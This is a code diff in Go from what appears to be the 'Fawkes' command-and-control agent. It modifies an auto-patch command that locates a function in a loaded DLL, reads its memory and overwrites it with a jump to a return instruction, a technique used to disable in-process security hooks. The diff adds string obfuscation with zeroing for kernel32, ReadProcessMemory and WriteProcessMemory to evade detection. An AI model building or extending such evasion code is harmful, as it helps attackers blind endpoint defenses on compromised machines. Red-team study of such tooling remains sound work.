@@ -10,6 +10,7 @@ import (
 	"syscall"
 	"unsafe"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 )
 
@@ -82,7 +83,7 @@ func (c *AutoPatchCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 		output, err := PerformAutoPatch(args.DllName, args.FunctionName, args.NumBytes)
 		if err != nil {
-			return errorResult(err.Error())
+			return errorf("Error patching %s!%s: %v", args.DllName, args.FunctionName, err)
 		}
 		return successResult(output)
 	default:
@@ -110,7 +111,7 @@ func autopatchTarget(targetName, strategy string) structs.CommandResult {
 
 	output, err := PatchTarget(target, strategy)
 	if err != nil {
-		return errorResult(err.Error())
+		return errorf("Error patching target '%s': %v", targetName, err)
 	}
 	return successResult(output)
 }
@@ -137,13 +138,13 @@ func PerformAutoPatch(dllName, functionName string, numBytes int) (string, error
 	// Load DLL
 	dll, err := syscall.LoadDLL(dllName)
 	if err != nil {
-		return "", fmt.Errorf("error loading DLL %s: %v", dllName, err)
+		return "", fmt.Errorf("error loading DLL %s: %w", dllName, err)
 	}
 
 	// Get function address
 	proc, err := dll.FindProc(functionName)
 	if err != nil {
-		return "", fmt.Errorf("error finding function %s: %v", functionName, err)
+		return "", fmt.Errorf("error finding function %s: %w", functionName, err)
 	}
 
 	functionAddress := proc.Addr()
@@ -153,8 +154,12 @@ func PerformAutoPatch(dllName, functionName string, numBytes int) (string, error
 	buffer := make([]byte, bufferSize)
 
 	// Read memory around the function address
-	k32 := syscall.MustLoadDLL("kernel32.dll")
-	readProcessMemory := k32.MustFindProc("ReadProcessMemory")
+	k32Name := obfuscate.Kernel32Dll()
+	defer obfuscate.Zero(k32Name)
+	rpmName := obfuscate.ReadProcessMemory()
+	defer obfuscate.Zero(rpmName)
+	k32 := syscall.MustLoadDLL(k32Name)
+	readProcessMemory := k32.MustFindProc(rpmName)
 
 	currentProcess, _ := syscall.GetCurrentProcess()
 	var bytesRead uintptr
@@ -171,7 +176,7 @@ func PerformAutoPatch(dllName, functionName string, numBytes int) (string, error
 	)
 
 	if ret == 0 {
-		return "", fmt.Errorf("error reading memory: %v", err)
+		return "", fmt.Errorf("error reading memory: %w", err)
 	}
 
 	// Find nearest C3 (return) instruction
@@ -211,7 +216,9 @@ func PerformAutoPatch(dllName, functionName string, numBytes int) (string, error
 	}
 
 	// Write jump instruction
-	writeProcessMemory := k32.MustFindProc("WriteProcessMemory")
+	wpmName := obfuscate.WriteProcessMemory()
+	defer obfuscate.Zero(wpmName)
+	writeProcessMemory := k32.MustFindProc(wpmName)
 	var bytesWritten uintptr
 
 	ret, _, err = writeProcessMemory.Call(
@@ -223,7 +230,7 @@ func PerformAutoPatch(dllName, functionName string, numBytes int) (string, error
 	)
 
 	if ret == 0 {
-		return "", fmt.Errorf("error writing jump instruction: %v", err)
+		return "", fmt.Errorf("error writing jump instruction: %w", err)
 	}
 
 	c3Address := targetAddress + uintptr(c3Index)
